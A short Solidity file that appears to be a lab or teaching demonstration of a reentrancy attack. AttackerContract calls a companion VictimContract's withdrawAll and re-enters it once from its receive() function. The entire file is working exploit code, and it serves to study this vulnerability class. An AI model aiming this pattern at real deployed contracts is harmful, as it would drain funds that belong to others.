// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;
import './VictimContract.sol';

// Attack contract
contract AttackerContract {
  VictimContract Victim;
  // this is used to stop the re-entrancy after the second time the Token
  // contract sends Ether to the Attacker contract.
  bool private abort;

  constructor(VictimContract _victim) {
    // for solidity 0.4.19
    /*function Mallory(Token _t) public {*/
    Victim = _victim;
    abort = false;
  }

  function attack() public payable {
    // call vulnerable withdrawAll
    Victim.withdrawAll();
  }

  receive() external payable {
    if (!abort) {
      // stop the second re-entrancy, which is caused by the transfer
      abort = true;
      Victim.exchangeAndWithdrawToken(Victim.getTokenCount());
    }
  }
}
